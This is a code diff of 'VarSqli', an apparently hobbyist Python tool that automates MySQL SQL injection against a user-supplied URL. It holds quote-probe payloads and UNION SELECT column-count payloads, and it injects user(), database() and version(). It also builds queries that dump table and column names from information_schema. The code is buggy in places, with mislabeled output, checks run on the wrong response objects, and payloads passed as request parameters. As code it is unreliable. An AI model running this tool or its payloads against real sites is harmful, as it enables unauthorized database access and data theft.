@@ -2,29 +2,33 @@ import requests
 import datetime
 import time
 import colorama
+import argparse
 import os
 from colorama import Fore
 from colorama import Style
 from bs4 import BeautifulSoup
+from lxml import etree
 
 colorama.init()
 
 def banner():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    starting = datetime.datetime.now().strftime("Starting VarSQLi %H:%M:%S - /%d/%m/%Y")
     print(Fore.YELLOW + Style.BRIGHT + '''
               ___
- _____         H  _____     _ _ 
+ _____         H  _____     _ _  {1.1.5}
 |  |  |___ ___[,]|   __|___| |_|
-|  |  | .'|  _[(]|__   | . | | |
+|  |  | .'|  _[(]|__   | . | | | {Phamchien}
  \___/|__,|_| [)]|_____|_  |_|_|
-               V         |_| 
+               V         |_|   ghostmanews.blogspot.com
 ''' + Style.RESET_ALL)
-    print("Copyright : Phamchien")
-    print("SQL Injection TOOLS")
+    print('''
+        VarSqli , Auto Injected MySQL
+Hoang Sa, Truong Sa Belong To Vietnam OK
+''')
+    print(Fore.BLUE + "{}".format(starting) + Style.RESET_ALL)
     print("")
 banner()
 
-URL = input("URL TARGET : ")
 check_vuln = [
     '%27',
     '*%27',
@@ -32,7 +36,6 @@ check_vuln = [
     '**%27',
 ]
 payloads = [
-    '/**8**/UNION SELECT ALL 1',
     '/**8**/UNION SELECT ALL 1,2',
     '/**8**/UNION SELECT ALL 1,2,3',
     '/**8**/UNION SELECT ALL 1,2,3,4',
@@ -54,105 +57,167 @@ payloads = [
     '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20',
 ]
 
-def checking_connect():
-    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Checking Connection...")
-    response = requests.get(URL)
-    if response.status_code == 200:
-        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Connection Completed , Status Code : {}".format(response.status_code))
+parser = argparse.ArgumentParser(description="VarSqli - (Variable Sql Injection) Tools V1.1.5")
+parser.add_argument('-u', '--url', dest='url', type=str, help='URL Target (ex : https://testphp.vulnweb.com/listproduct?cat=1)')
+parser.add_argument('--check-vuln', dest='check', action='store_true', help='Checking Vulnerablity SQL Injection')
+parser.add_argument('--check-columns', dest='columns', action='store_true', help='Checking Get Number Columns')
+parser.add_argument('--dump-dbs', dest='dbs', action='store_true', help='Checking Get Dbs')
+
+parser.add_argument('--dump-tables', dest='tables', action='store_true', help='Dump DBMS Tables')
+parser.add_argument('-T', '--tables-name', dest='name_db', help='Name Database to Testing GET Columns Tables')
+
+parser.add_argument('--dump-columns', dest='column', action='store_true', help='Dump DBMS Columns ')
+parser.add_argument('-C', '--columns-name', dest='name_column', help='Name columns DBMS to Testing GET Columns from Tables')
+args = parser.parse_args()
+
+URL_TARGET = args.url
+
+if URL_TARGET:
+    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Checking Connect HTTP From Target...")
+    check_conn = requests.get(URL_TARGET)
+    if check_conn.status_code == 200:
+        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
         time.sleep(1)
-        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Testing MySQL Injection...")
-        for payload_check in check_vuln:
-            response_1 = requests.get(URL + payload_check)
-            if "at line" or "on line" in response_1.text:
-                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed...")
-                time.sleep(1)
-                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Target VULNERABLE 50% MySQL Injection")
-                time.sleep(0.30)
-                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Testing MySQL GET columns")
-                for payload in payloads:
-                    response_2 = requests.get(URL + payload)
-                    if "1" and "2" and "3" and "4" and "5" and "6" and "7" and "8" and "9" and "10" and "11" and "12" in response_2.text:
-                        if "The used SELECT" and "Error:" != response_2.text:
+        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Status Code {}".format(check_conn.status_code))
+        
+        if args.check:
+            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Checking Vulnerablity SQL Injection...")
+            for payload_1 in check_vuln:
+                result_1 = requests.get(URL_TARGET + payload_1)
+                if "at line" in result_1.text:
+                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
+                    time.sleep(0.20)
+                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Target May Be Vulnerable")
+                    exit()
+                else:
+                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                    exit("Ending {}".format(end_time))
 
-                            print("")
-                            print("Testing SQL injection Completed : ")
-                            print("Parameter : #1(URI)*")
-                            print("     Type : Code By Pham Chien")
-                            print("     Title : UNION SELECT COLUMNS")
-                            print("     Payload : {}".format(payload))
-                            print("     Status : {}".format(response_2.status_code))
-                            print("     URL : {}".format(URL))
-                            print("     Details : Vulnerable")
-                            print("")
-                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Completed")
-                            time.sleep(0.40)
-                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting GET Name User MySQL...")
-                            query = payload
-                            payload_1 = query.replace("2", "user()")
-                            response_3 = requests.get(URL + payload_1)
-                            soup = BeautifulSoup(response_3.text, 'html.parser')
-                            get_user = soup.find('h1')
-                            get_user1 = soup.find('b')
-                            if "[]" != get_user or "[]" != get_user1:
-                                if "The used SELECT" != response_3.text:
-                                    if "[]" != get_user:
-                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed...")
-                                        time.sleep(2)
-                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Payload : {}{}".format(URL, payload_1))
-                                        time.sleep(0.20)
-                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "User MySQL : {}{}".format(get_user, get_user1))
-                                        time.sleep(0.20)
-                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting GET Database name...")
-                                        payload_2 = query.replace("2", "database()")
-                                        response_4 = requests.get(URL + payload_2)
-                                        get_dbs = BeautifulSoup(response_4.text, 'html.parser')
-                                        dbs = get_dbs.find('h1')
-                                        dbs_2 = get_dbs.find('b')
-                                        if "[]" != dbs or "[]" != dbs_2:
-                                            if "The used SELECT" != response_4.text:
-                                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed...")
-                                                time.sleep(2)
-                                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Payload : {}{}".format(URL, payload_2))
-                                                time.sleep(0.20)
-                                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Database Name : {}{}".format(dbs, dbs_2))
-                                                time.sleep(0.20)
-                                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting GET Version MySQL...")
-                                                payload_3 = payload.replace("2", "version()")
-                                                response_5 = requests.get(URL + payload_3)
-                                                get_ver = BeautifulSoup(response_5.text, 'html.parser')
-                                                ver_1 = get_ver.find('h1')
-                                                ver_2 = get_ver.find('b')
-                                                if "[]" != ver_1 or "[]" != ver_2:
-                                                    if "The used SELECT" != response_5.text:
-                                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed...")
-                                                        time.sleep(2)
-                                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Payload : {}{}".format(URL, payload_2))
-                                                        time.sleep(0.20)
-                                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Version : {}{}".format(ver_1, ver_2))
-                                                        time.sleep(0.20)
-                                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Find ALL, (user mysql, database name, version mysql)...")
-                                                        time.sleep(2)
-                                                        print("Find OUTPUT database : ")
-                                                        print("     User MySQL : {}{}".format(get_user, get_user1))
-                                                        print("     DBS Name : {}{}".format(dbs, dbs_2))
-                                                        print("     Version MySQL : {}{}".format(ver_1, ver_2))
-                                                        exit()
-                                                else:
-                                                    print(Fore.RED + "[WARNING] " + Style.RESET_ALL + "Version : Failed")
-                                                    exit()
-                                        else:
-                                            print(Fore.RED + "[WARNING] " + Style.RESET_ALL + "Dbs : Failed")
-                                            exit()
-                                    else:     
-                                        print(Fore.RED + "[WARNING] " + Style.RESET_ALL + "User : Failed")
-                                        exit()
-                            else:
-                                print(Fore.RED + "[WARNING] " + Style.RESET_ALL + "Testing payload Failed : {}".format(payload_1))
-                                exit()
+        if args.columns:
+            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Testing Payload UNION SELECT ALL (Number Columns MySQL)")
+            num_columns = 1
+            for payload_2 in payloads:
+                num_columns += 1
+                result_2 = requests.get(URL_TARGET + payload_2)
+                if str(num_columns) in result_2.text:
+                    if "The used SELECT" in result_2.text:
+                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Testing Payload {}".format(payload_2))
                     else:
-                        print(Fore.RED + Style.BRIGHT + "[WARNING] " + Style.RESET_ALL + "your target is not columns")
-                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload))
-                exit()
+                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Completed")
+                        print("Parameter : 1")
+                        print("     Type : UNION SELECT ALL (Number Columns MySQL)")
+                        print("     Title : GETING columns number MySQL")
+                        print("     Payload : {}".format(payload_2))
+                        print("     URL : {}".format(URL_TARGET))
+                        print("     Columns : : {}".format(num_columns))
+                        print("")
+                        if args.dbs:
+                            payload_3 = payload_2.replace("2", "user()")
+                            payload_4 = payload_2.replace("2", "database()")
+                            payload_5 = payload_2.replace("2", "version()")
+                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
+                            result_3 = requests.get(URL_TARGET + payload_3)
+                            if "The used SELECT" in result_3:
+                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
+                                exit()
+                            else:
+                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed User MySQL : {}{}".format(URL_TARGET, payload_3))
+                                print("Username MySQL : ")
+                                print("      Payload : {}".format(payload_3))
+                                print("      URL : {}".format(URL_TARGET))
+                                print("")
+                                print("      LINK : {}{}".format(URL_TARGET, payload_3))
+                                print("")
 
-if __name__ == '__main__':
-    checking_connect()
+                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get database name....")
+                            time.sleep(1)
+                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
+                            result_4 = requests.get(URL_TARGET + payload_4)
+                            if "The used SELECT" in result_3:
+                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
+                                exit()
+                            else:
+                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_4))
+                                print("Username MySQL : ")
+                                print("      Payload : {}".format(payload_4))
+                                print("      URL : {}".format(URL_TARGET))
+                                print("")
+                                print("      LINK : {}{}".format(URL_TARGET, payload_4))
+                                print("")
+                                print("      Name Database 1 : information_schema")
+                                print("")
+                                
+                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get version MySQL....")
+                            time.sleep(1)
+                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
+                            result_5 = requests.get(URL_TARGET + payload_5)
+                            if "The used SELECT" in result_3:
+                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
+                                exit()
+                            else:
+                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_5))
+                                print("Username MySQL : ")
+                                print("      Payload : {}".format(payload_5))
+                                print("      URL : {}".format(URL_TARGET))
+                                print("")
+                                print("      LINK : {}{}".format(URL_TARGET, payload_5))
+                                print("")
+
+                        else:
+                            print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-dbs")
+                        
+                        if args.tables:
+                            if args.name_db:
+                                query = payload_2.replace("2", "table_name")
+                                payload_6 = f"{query} From information_schema.tables where table_schema = '{args.name_db}'"
+                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
+                                result_6 = requests.get(URL_TARGET, payload_6)
+                                if "The used SELECT" in result_6:
+                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
+                                    exit()
+                                else:
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
+                                    print("Username MySQL : ")
+                                    print("      Payload : {}".format(payload_6))
+                                    print("      URL : {}".format(URL_TARGET))
+                                    print("")
+                                    print("      LINK : {}{}".format(URL_TARGET, payload_6))
+                                    print("")
+                                    
+                            else:
+                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-tables -T < Name DB >")
+
+                        if args.column:
+                            if args.name_column:
+                                query_1 = payload_2.replace("2", "column_name")
+                                payload_7 = f"{query_1} From information_schema.columns where table_schema = '{args.name_column}'"
+                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_7))
+                                result_6 = requests.get(URL_TARGET, payload_7)
+                                if "The used SELECT" in result_6:
+                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
+                                    exit()
+                                else:
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_7))
+                                    print("Username MySQL : ")
+                                    print("      Payload : {}".format(payload_7))
+                                    print("      URL : {}".format(URL_TARGET))
+                                    print("")
+                                    print("      LINK : {}{}".format(URL_TARGET, payload_7))
+                                    print("")
+                                    exit()
+                            else:
+                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-columns -C < Name DB >")
+                                
+                else:
+                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Failed Get Columns")
+                    exit()
+        else:
+            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns")
+            exit()
+else:  
+    print("Usage : python3 varsqli.py -u <url> --check-columns")
+    print("Help : python3 varsqli.py --help or -h")
+    print('''
+[+] Nevertheless, conducting SQL Injection attacks or using the VarSqli tool to attack a system without proper authorization or exceeding legal boundaries may be considered a violation of the law and can result in criminal penalties.
+''')
